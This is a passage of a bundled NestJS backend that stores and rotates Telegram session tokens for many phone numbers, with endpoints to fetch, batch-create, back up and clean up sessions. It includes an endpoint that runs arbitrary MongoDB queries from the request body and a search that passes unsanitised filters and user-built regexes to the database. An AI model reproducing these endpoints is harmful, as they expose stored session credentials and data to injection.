    (0, mongoose_1.Prop)({ type: mongoose.Schema.Types.Number, default: 0 }),
    __metadata("design:type", Number)
], ActiveChannel.prototype, "wordRestriction", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: Number, default: 0 }),
    (0, mongoose_1.Prop)({ type: mongoose.Schema.Types.Number, default: 0 }),
    __metadata("design:type", Number)
], ActiveChannel.prototype, "dMRestriction", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: [String], default: utils_1.defaultMessages }),
    (0, mongoose_1.Prop)({ type: [String], default: utils_1.defaultMessages }),
    __metadata("design:type", Array)
], ActiveChannel.prototype, "availableMsgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "banned", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: true }),
    (0, mongoose_1.Prop)({ default: true }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "megagroup", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "private", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "reactRestricted", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "forbidden", void 0);
exports.ActiveChannel = ActiveChannel = __decorate([
    (0, mongoose_1.Schema)({ collection: 'activeChannels', versionKey: false, autoIndex: true,
        timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], ActiveChannel);
exports.ActiveChannelSchema = mongoose_1.SchemaFactory.createForClass(ActiveChannel);


/***/ }),

/***/ "./src/components/archived-clients/archived-client.controller.ts":
/*!***********************************************************************!*\
  !*** ./src/components/archived-clients/archived-client.controller.ts ***!
  \***********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ArchivedClientController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const archived_client_schema_1 = __webpack_require__(/*! ./schemas/archived-client.schema */ "./src/components/archived-clients/schemas/archived-client.schema.ts");
const archived_client_service_1 = __webpack_require__(/*! ./archived-client.service */ "./src/components/archived-clients/archived-client.service.ts");
const create_archived_client_dto_1 = __webpack_require__(/*! ./dto/create-archived-client.dto */ "./src/components/archived-clients/dto/create-archived-client.dto.ts");
const search_client_dto_1 = __webpack_require__(/*! ../clients/dto/search-client.dto */ "./src/components/clients/dto/search-client.dto.ts");
const update_client_dto_1 = __webpack_require__(/*! ../clients/dto/update-client.dto */ "./src/components/clients/dto/update-client.dto.ts");
const session_update_dto_1 = __webpack_require__(/*! ./dto/session-update.dto */ "./src/components/archived-clients/dto/session-update.dto.ts");
const cleanup_sessions_dto_1 = __webpack_require__(/*! ./dto/cleanup-sessions.dto */ "./src/components/archived-clients/dto/cleanup-sessions.dto.ts");
const session_status_dto_1 = __webpack_require__(/*! ./dto/session-status.dto */ "./src/components/archived-clients/dto/session-status.dto.ts");
let ArchivedClientController = class ArchivedClientController {
    constructor(archivedclientService) {
        this.archivedclientService = archivedclientService;
    }
    async create(createArchivedClientDto) {
        return this.archivedclientService.create(createArchivedClientDto);
    }
    async search(query) {
        return this.archivedclientService.search(query);
    }
    async findAll() {
        return this.archivedclientService.findAll();
    }
    async checkArchivedClients() {
        return this.archivedclientService.checkArchivedClients();
    }
    async findOne(mobile) {
        return this.archivedclientService.findOne(mobile);
    }
    async fetchOne(mobile) {
        return this.archivedclientService.fetchOne(mobile);
    }
    async update(mobile, updateClientDto) {
        return this.archivedclientService.update(mobile, updateClientDto);
    }
    async remove(mobile) {
        return this.archivedclientService.remove(mobile);
    }
    async executeQuery(query) {
        if (!query || Object.keys(query).length === 0) {
            throw new common_1.BadRequestException('Query cannot be empty');
        }
        return await this.archivedclientService.executeQuery(query);
    }
    async updateSession(mobile, sessionUpdateDto) {
        return this.archivedclientService.updateSession(mobile, sessionUpdateDto.newSession);
    }
    async getOldSessions(mobile) {
        return this.archivedclientService.getOldSessions(mobile);
    }
    async cleanupOldSessions(mobile, cleanupDto) {
        return this.archivedclientService.cleanupOldSessions(mobile, cleanupDto?.maxSessions);
    }
    async checkSessionStatus(mobile) {
        return this.archivedclientService.getSessionStatus(mobile);
    }
    async batchFetchSessions(mobiles) {
        return this.archivedclientService.batchFetchSessions(mobiles);
    }
    async getCacheStats() {
        return this.archivedclientService.getCacheStatistics();
    }
};
exports.ArchivedClientController = ArchivedClientController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({
        summary: 'Create new archived client',
        description: 'Creates a new archived client record with session information. Used when a Telegram client becomes inactive but needs to be preserved for potential future reactivation.'
    }),
    (0, swagger_1.ApiBody)({
        type: create_archived_client_dto_1.CreateArchivedClientDto,
        description: 'Archived client data including mobile number and session token'
    }),
    (0, swagger_1.ApiOkResponse)({
        description: 'Archived client successfully created',
        type: archived_client_schema_1.ArchivedClient
    }),
    (0, swagger_1.ApiBadRequestResponse)({ description: 'Invalid input data provided' }),
    (0, swagger_1.ApiInternalServerErrorResponse)({ description: 'Internal server error occurred' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_archived_client_dto_1.CreateArchivedClientDto]),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({
        summary: 'Search archived clients',
        description: 'Search for archived clients using various filter criteria. Supports partial matching for names and exact matching for other fields.'
    }),
    (0, swagger_1.ApiQuery)({ name: 'clientId', required: false, description: 'Unique client identifier' }),
    (0, swagger_1.ApiQuery)({ name: 'dbcoll', required: false, description: 'Database collection name for filtering' }),
    (0, swagger_1.ApiQuery)({ name: 'channelLink', required: false, description: 'Associated channel link' }),
    (0, swagger_1.ApiQuery)({ name: 'link', required: false, description: 'Client profile link' }),
    (0, swagger_1.ApiQuery)({ name: 'firstName', required: false, description: 'First name (supports partial matching)' }),
    (0, swagger_1.ApiOkResponse)({
        description: 'List of archived clients matching search criteria',
        type: [archived_client_schema_1.ArchivedClient]
    }),
    (0, swagger_1.ApiBadRequestResponse)({ description: 'Invalid search parameters' }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_client_dto_1.SearchClientDto]),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "search", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({
        summary: 'Get all archived clients',
        description: 'Retrieves a complete list of all archived clients in the system. Use with caution on large datasets.'
    }),
    (0, swagger_1.ApiOkResponse)({
        description: 'Complete list of all archived clients',
        type: [archived_client_schema_1.ArchivedClient]
    }),
    (0, swagger_1.ApiInternalServerErrorResponse)({ description: 'Database error occurred' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)('maintenance/check-archived-clients'),
    (0, swagger_1.ApiOperation)({
        summary: 'Run archived clients maintenance check',
        description: 'Performs comprehensive maintenance on all archived clients including session validation, profile updates, and cleanup of inactive sessions. This is a long-running operation that should be used during maintenance windows.'
    }),
    (0, swagger_1.ApiOkResponse)({
        description: 'Maintenance check completed successfully',
        schema: {
            type: 'string',
            example: 'Archived clients check completed. Processed: 150, Updated: 23, Deleted: 5, Errors: 2'
        }
    }),
    (0, swagger_1.ApiInternalServerErrorResponse)({ description: 'Maintenance operation failed' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "checkArchivedClients", null);
__decorate([
    (0, common_1.Get)(':mobile'),
    (0, swagger_1.ApiOperation)({
        summary: 'Get archived client by mobile number',
        description: 'Retrieves a specific archived client using their mobile number. Returns null if not found.'
    }),
    (0, swagger_1.ApiParam)({
        name: 'mobile',
        description: 'Mobile number of the archived client',
        example: '916265240911'
    }),
    (0, swagger_1.ApiOkResponse)({
        description: 'Archived client found',
        type: archived_client_schema_1.ArchivedClient
    }),
    (0, swagger_1.ApiNotFoundResponse)({ description: 'Archived client not found' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "findOne", null);
__decorate([
    (0, common_1.Get)('fetch/:mobile'),
    (0, swagger_1.ApiOperation)({
        summary: 'Fetch or create archived client',
        description: 'Retrieves an archived client by mobile number. If not found, creates a new session and archived client record automatically.'
    }),
    (0, swagger_1.ApiParam)({
        name: 'mobile',
        description: 'Mobile number of the client',
        example: '916265240911'
    }),
    (0, swagger_1.ApiOkResponse)({
        description: 'Archived client retrieved or created',
        type: archived_client_schema_1.ArchivedClient
    }),
    (0, swagger_1.ApiNotFoundResponse)({ description: 'Could not create session for the mobile number' }),
    (0, swagger_1.ApiInternalServerErrorResponse)({ description: 'Session creation failed' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "fetchOne", null);
__decorate([
    (0, common_1.Patch)(':mobile'),
    (0, swagger_1.ApiOperation)({
        summary: 'Update archived client',
        description: 'Updates an existing archived client record. Uses upsert operation - creates if not exists.'
    }),
    (0, swagger_1.ApiParam)({
        name: 'mobile',
        description: 'Mobile number of the archived client',
        example: '916265240911'
    }),
    (0, swagger_1.ApiBody)({
        type: update_client_dto_1.UpdateClientDto,
        description: 'Fields to update (partial update supported)'
    }),
    (0, swagger_1.ApiOkResponse)({
        description: 'Archived client updated successfully',
        type: archived_client_schema_1.ArchivedClient
    }),
    (0, swagger_1.ApiBadRequestResponse)({ description: 'Invalid update data' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_client_dto_1.UpdateClientDto]),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':mobile'),
    (0, swagger_1.ApiOperation)({
        summary: 'Delete archived client',
        description: 'Permanently removes an archived client record from the system.'
    }),
    (0, swagger_1.ApiParam)({
        name: 'mobile',
        description: 'Mobile number of the archived client to delete',
        example: '916265240911'
    }),
    (0, swagger_1.ApiOkResponse)({
        description: 'Archived client deleted successfully',
        type: archived_client_schema_1.ArchivedClient
    }),
    (0, swagger_1.ApiNotFoundResponse)({ description: 'Archived client not found' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "remove", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({
        summary: 'Execute custom MongoDB query',
        description: 'Executes a custom MongoDB query against the archived clients collection. Use with caution as this provides direct database access.'
    }),
    (0, swagger_1.ApiBody)({
        description: 'MongoDB query object',
        schema: {
            type: 'object',
            example: {
                mobile: '916265240911'
            }
        }
    }),
    (0, swagger_1.ApiOkResponse)({
        description: 'Query executed successfully',
        schema: {
            type: 'array',
            items: { $ref: '#/components/schemas/ArchivedClient' }
        }
    }),
    (0, swagger_1.ApiBadRequestResponse)({ description: 'Invalid query provided' }),
    (0, swagger_1.ApiInternalServerErrorResponse)({ description: 'Query execution failed' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "executeQuery", null);
__decorate([
    (0, common_1.Put)(':mobile/session'),
    (0, swagger_1.ApiOperation)({
        summary: 'Update session with backup',
        description: 'Updates the main session for an archived client. If the current session is still active, it will be backed up to oldSessions array before being replaced.'
    }),
    (0, swagger_1.ApiParam)({
        name: 'mobile',
        description: 'Mobile number of the archived client',
        example: '916265240911'
    }),
    (0, swagger_1.ApiBody)({
        type: session_update_dto_1.SessionUpdateDto,
        description: 'New session data'
    }),
    (0, swagger_1.ApiOkResponse)({
        description: 'Session updated successfully',
        type: archived_client_schema_1.ArchivedClient
    }),
    (0, swagger_1.ApiNotFoundResponse)({ description: 'Archived client not found' }),
    (0, swagger_1.ApiBadRequestResponse)({ description: 'Invalid session token provided' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, session_update_dto_1.SessionUpdateDto]),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "updateSession", null);
__decorate([
    (0, common_1.Get)(':mobile/old-sessions'),
    (0, swagger_1.ApiOperation)({
        summary: 'Get old sessions for client',
        description: 'Retrieves all old session tokens stored for an archived client. These are previous sessions that were backed up when new sessions were set.'
    }),
    (0, swagger_1.ApiParam)({
        name: 'mobile',
        description: 'Mobile number of the archived client',
        example: '916265240911'
    }),
    (0, swagger_1.ApiOkResponse)({
        description: 'List of old session tokens',
        schema: {
            type: 'array',
            items: {
                type: 'string',
                description: 'Session token'
            },
            example: ['1BQANOTEuM==', '2CRANOTEuN==', '3DRANOTEuO==']
        }
    }),
    (0, swagger_1.ApiNotFoundResponse)({ description: 'Archived client not found' }),
    (0, swagger_1.ApiBadRequestResponse)({ description: 'Mobile number is required' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "getOldSessions", null);
__decorate([
    (0, common_1.Post)(':mobile/cleanup-sessions'),
    (0, swagger_1.ApiOperation)({
        summary: 'Clean up old sessions',
        description: 'Removes inactive old sessions and limits the number of stored old sessions. Only keeps the most recent active sessions up to the specified limit.'
    }),
    (0, swagger_1.ApiParam)({
        name: 'mobile',
        description: 'Mobile number of the archived client',
        example: '916265240911'
    }),
    (0, swagger_1.ApiBody)({
        type: cleanup_sessions_dto_1.CleanupSessionsDto,
        description: 'Cleanup configuration',
        required: false
    }),
    (0, swagger_1.ApiOkResponse)({
        description: 'Session cleanup completed successfully',
        type: archived_client_schema_1.ArchivedClient
    }),
    (0, swagger_1.ApiNotFoundResponse)({ description: 'Archived client not found' }),
    (0, swagger_1.ApiBadRequestResponse)({ description: 'Invalid maxSessions value' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, cleanup_sessions_dto_1.CleanupSessionsDto]),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "cleanupOldSessions", null);
__decorate([
    (0, common_1.Get)(':mobile/session-status'),
    (0, swagger_1.ApiOperation)({
        summary: 'Check session status',
        description: 'Checks if the current session for an archived client is active. This is useful for verifying session health before performing operations.'
    }),
    (0, swagger_1.ApiParam)({
        name: 'mobile',
        description: 'Mobile number of the archived client',
        example: '916265240911'
    }),
    (0, swagger_1.ApiOkResponse)({
        description: 'Session status information',
        type: session_status_dto_1.SessionStatusDto
    }),
    (0, swagger_1.ApiNotFoundResponse)({ description: 'Archived client not found' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "checkSessionStatus", null);
__decorate([
    (0, common_1.Post)('batch-fetch'),
    (0, swagger_1.ApiOperation)({
        summary: 'Batch fetch sessions for multiple mobiles',
        description: 'Efficiently retrieves or creates active sessions for multiple mobile numbers in a single request. Useful for bulk operations.'
    }),
    (0, swagger_1.ApiBody)({
        description: 'Array of mobile numbers to process',
        schema: {
            type: 'object',
            properties: {
                mobiles: {
                    type: 'array',
                    items: { type: 'string' },
                    maxItems: 50,
                    example: ['916265240911', '916265240912', '916265240913']
                }
            },
            required: ['mobiles']
        }
    }),
    (0, swagger_1.ApiOkResponse)({
        description: 'Batch processing results',
        schema: {
            type: 'array',
            items: {
                type: 'object',
                properties: {
                    mobile: { type: 'string' },
                    client: { $ref: '#/components/schemas/ArchivedClient' },
                    error: { type: 'string' }
                }
            }
        }
    }),
    (0, swagger_1.ApiBadRequestResponse)({ description: 'Invalid batch request or too many mobiles' }),
    __param(0, (0, common_1.Body)('mobiles')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Array]),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "batchFetchSessions", null);
__decorate([
    (0, common_1.Get)('health/cache-stats'),
    (0, swagger_1.ApiOperation)({
        summary: 'Get session validation cache statistics',
        description: 'Returns statistics about the internal session validation cache for monitoring and debugging purposes.'
    }),
    (0, swagger_1.ApiOkResponse)({
        description: 'Cache statistics',
        schema: {
            type: 'object',
            properties: {
                totalEntries: { type: 'number', example: 150 },
                validEntries: { type: 'number', example: 120 },
                expiredEntries: { type: 'number', example: 30 },
                cacheHitRate: { type: 'string', example: '85%' },
                lastCleanup: { type: 'string', format: 'date-time' }
            }
        }
    }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ArchivedClientController.prototype, "getCacheStats", null);
exports.ArchivedClientController = ArchivedClientController = __decorate([
    (0, swagger_1.ApiTags)('Archived Clients'),
    (0, common_1.Controller)('archived-clients'),
    __metadata("design:paramtypes", [archived_client_service_1.ArchivedClientService])
], ArchivedClientController);


/***/ }),

/***/ "./src/components/archived-clients/archived-client.module.ts":
/*!*******************************************************************!*\
  !*** ./src/components/archived-clients/archived-client.module.ts ***!
  \*******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ArchivedClientModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const archived_client_schema_1 = __webpack_require__(/*! ./schemas/archived-client.schema */ "./src/components/archived-clients/schemas/archived-client.schema.ts");
const Telegram_module_1 = __webpack_require__(/*! ../Telegram/Telegram.module */ "./src/components/Telegram/Telegram.module.ts");
const archived_client_service_1 = __webpack_require__(/*! ./archived-client.service */ "./src/components/archived-clients/archived-client.service.ts");
const archived_client_controller_1 = __webpack_require__(/*! ./archived-client.controller */ "./src/components/archived-clients/archived-client.controller.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const client_module_1 = __webpack_require__(/*! ../clients/client.module */ "./src/components/clients/client.module.ts");
let ArchivedClientModule = class ArchivedClientModule {
};
exports.ArchivedClientModule = ArchivedClientModule;
exports.ArchivedClientModule = ArchivedClientModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ collection: 'archivedClients', name: 'ArchivedClient', schema: archived_client_schema_1.ArchivedClientSchema }]),
            (0, common_1.forwardRef)(() => Telegram_module_1.TelegramModule),
            (0, common_1.forwardRef)(() => client_module_1.ClientModule)
        ],
        controllers: [archived_client_controller_1.ArchivedClientController],
        providers: [archived_client_service_1.ArchivedClientService],
        exports: [archived_client_service_1.ArchivedClientService]
    })
], ArchivedClientModule);


/***/ }),

/***/ "./src/components/archived-clients/archived-client.service.ts":
/*!********************************************************************!*\
  !*** ./src/components/archived-clients/archived-client.service.ts ***!
  \********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var ArchivedClientService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ArchivedClientService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const Telegram_service_1 = __webpack_require__(/*! ../Telegram/Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const client_service_1 = __webpack_require__(/*! ../clients/client.service */ "./src/components/clients/client.service.ts");
const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
const connection_manager_1 = __webpack_require__(/*! ../Telegram/utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
let ArchivedClientService = ArchivedClientService_1 = class ArchivedClientService {
    constructor(archivedclientModel, telegramService, clientService) {
        this.archivedclientModel = archivedclientModel;
        this.telegramService = telegramService;
        this.clientService = clientService;
        this.logger = new common_1.Logger(ArchivedClientService_1.name);
        this.MAX_OLD_SESSIONS = 10;
        this.SESSION_GENERATION_TIMEOUT = 30000;
        this.MAX_RETRY_ATTEMPTS = 3;
        this.SESSION_VALIDATION_CACHE = new Map();
        this.CACHE_EXPIRY = 5 * 60 * 1000;
    }
    async create(createArchivedClientDto) {
        try {
            this.logger.log(`Creating new archived client for mobile: ${createArchivedClientDto.mobile}`);
            const createdUser = new this.archivedclientModel({
                ...createArchivedClientDto,
                createdAt: new Date(),
                sessionHistory: [{
                        session: createArchivedClientDto.session,
                        createdAt: new Date(),
                        status: 'active',
                        source: 'initial_creation'
                    }]
            });
            const result = await createdUser.save();
            this.logger.log(`Successfully created archived client for mobile: ${createArchivedClientDto.mobile}`);
            return result;
        }
        catch (error) {
            this.logger.error(`Failed to create archived client for mobile ${createArchivedClientDto.mobile}:`, error);
            throw new common_1.InternalServerErrorException(`Failed to create archived client: ${error.message}`);
        }
    }
    async findAll() {
        const results = await this.archivedclientModel.find().exec();
        return results;
    }
    async findOne(mobile) {
        const user = (await this.archivedclientModel.findOne({ mobile }).exec())?.toJSON();
        return user;
    }
    async fetchOne(mobile) {
        if (!mobile) {
            throw new common_1.BadRequestException('Mobile number is required');
        }
        this.logger.log(`Session factory request for mobile: ${mobile}`);
        try {
            const archivedClient = await this.findOne(mobile);
            if (archivedClient) {
                this.logger.log(`Found existing archived client for ${mobile}`);
                const isCurrentSessionActive = await this.isSessionActive(mobile, archivedClient.session);
                if (isCurrentSessionActive) {
                    this.logger.log(`Current session for ${mobile} is active, returning existing session`);
                    await this.auditSessionAccess(mobile, archivedClient.session, 'session_reused');
                    return archivedClient;
                }
                this.logger.log(`Current session for ${mobile} is inactive, attempting to find active session from history`);
                const activeSession = await this.findActiveSessionFromHistory(archivedClient);
                if (activeSession) {
                    this.logger.log(`Found active session in history for ${mobile}, promoting it`);
                    return await this.promoteActiveSession(mobile, activeSession, archivedClient);
                }
                this.logger.log(`No active sessions found for ${mobile}, generating new session`);
                return await this.generateAndUpdateSession(mobile, archivedClient);
            }
            else {
                this.logger.log(`New client ${mobile}, creating fresh session`);
                return await this.createNewClientWithSession(mobile);
            }
        }
        catch (error) {
            this.logger.error(`Session factory failed for mobile ${mobile}:`, error);
            throw new common_1.InternalServerErrorException(`Session generation failed: ${(0, parseError_1.parseError)(error).message}`);
        }
    }
    async update(mobile, updateClientDto) {
        delete updateClientDto["_id"];
        if (updateClientDto._doc) {
            delete updateClientDto._doc['_id'];
        }
        console.log({ ...updateClientDto });
        const updatedUser = await this.archivedclientModel.findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, upsert: true }).exec();
        return updatedUser;
    }
    async remove(mobile) {
        const deletedUser = await this.archivedclientModel.findOneAndDelete({ mobile }).exec();
        if (!deletedUser) {
            throw new common_1.NotFoundException(`Client with ID "${mobile}" not found`);
        }
        return deletedUser;
    }
    async search(filter) {
        console.log(filter);
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
        }
        console.log(filter);
        return this.archivedclientModel.find(filter).exec();
    }
    async checkArchivedClients() {
        console.log('Starting archived clients check...');
        await (0, Helpers_1.sleep)(2000);
        const archivedClients = await this.findAll();
        const clients = await this.clientService.findAll();
        const clientIds = clients.map(client => client.mobile);
        console.log(`Found ${archivedClients.length} archived clients to check`);
        let processedCount = 0;
        let updatedCount = 0;
        let deletedCount = 0;
        let errorCount = 0;
        for (const document of archivedClients) {
            try {
                processedCount++;
                console.log(`Processing ${processedCount}/${archivedClients.length}: ${document.mobile}`);
                if (!clientIds.includes(document.mobile)) {
                    const sessionCheckResult = await this.checkAndUpdateMainSession(document);
                    if (sessionCheckResult.updated) {
                        updatedCount++;
                        console.log(`Updated session for archived client ${document.mobile}`);
                    }
                    await this.cleanupOldSessions(document.mobile, 3);
                    try {
                        const currentClient = await this.findOne(document.mobile);
                        if (currentClient && currentClient.session) {
                            await connection_manager_1.connectionManager.getClient(document.mobile, { autoDisconnect: true, handler: false });
                            await this.telegramService.updateUsername(document.mobile, '');
                            await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');
                            console.log(`Updated Telegram profile for archived client ${document.mobile}`);
                        }
                    }
                    catch (telegramError) {
                        console.log(`Could not update Telegram profile for ${document.mobile}:`, telegramError.message);
                        if (sessionCheckResult.allSessionsDead) {
                            try {
                                await this.remove(document.mobile);
                                deletedCount++;
                                console.log(`Removed archived client ${document.mobile} - all sessions dead`);
                            }
                            catch (removeError) {
                                console.log(`Could not remove dead archived client ${document.mobile}:`, removeError.message);
                            }
                        }
                    }
                    finally {
                        await connection_manager_1.connectionManager.unregisterClient(document.mobile);
                    }
                }
                else {
                    console.log(`${document.mobile} is an active client, skipping archived client processing`);
                }
                await (0, Helpers_1.sleep)(1000);
            }
            catch (error) {
                errorCount++;
                console.log(`Error processing archived client ${document.mobile}:`, error.message);
            }
        }
        const summary = {
            total: archivedClients.length,
            processed: processedCount,
            updated: updatedCount,
            deleted: deletedCount,
            errors: errorCount
        };
        console.log('Archived clients check completed:', summary);
        return `Archived clients check completed. Processed: ${processedCount}, Updated: ${updatedCount}, Deleted: ${deletedCount}, Errors: ${errorCount}`;
    }
    async checkAndUpdateMainSession(archivedClient) {
        const mobile = archivedClient.mobile;
        console.log(`Checking main session for ${mobile}...`);
        const isMainSessionActive = await this.isSessionActive(mobile, archivedClient.session);
        if (isMainSessionActive) {
            console.log(`Main session for ${mobile} is active`);
            return { updated: false, allSessionsDead: false };
        }
        console.log(`Main session for ${mobile} is inactive, checking old sessions...`);
        const oldSessions = archivedClient.oldSessions || [];
        if (oldSessions.length === 0) {
            console.log(`No old sessions available for ${mobile}`);
            return { updated: false, allSessionsDead: true };
        }
        for (let i = oldSessions.length - 1; i >= 0; i--) {
            const oldSession = oldSessions[i];
            console.log(`Testing old session ${i + 1}/${oldSessions.length} for ${mobile}...`);
            try {
                const isOldSessionActive = await this.isSessionActive(mobile, oldSession);
                if (isOldSessionActive) {
                    console.log(`Found active old session for ${mobile}, promoting to main session`);
                    const remainingOldSessions = oldSessions.filter((_, index) => index !== i);
                    remainingOldSessions.unshift(archivedClient.session);
                    const trimmedOldSessions = remainingOldSessions.slice(0, this.MAX_OLD_SESSIONS);
                    await this.archivedclientModel.findOneAndUpdate({ mobile }, {
                        $set: {
                            session: oldSession,
                            oldSessions: trimmedOldSessions
                        }
                    }, { new: true }).exec();
                    console.log(`Successfully promoted old session to main session for ${mobile}`);
                    return { updated: true, allSessionsDead: false };
                }
            }
            catch (error) {
                console.log(`Error checking old session for ${mobile}:`, error.message);
            }
        }
        console.log(`No active sessions found for ${mobile}`);
        return { updated: false, allSessionsDead: true };
    }
    async executeQuery(query) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
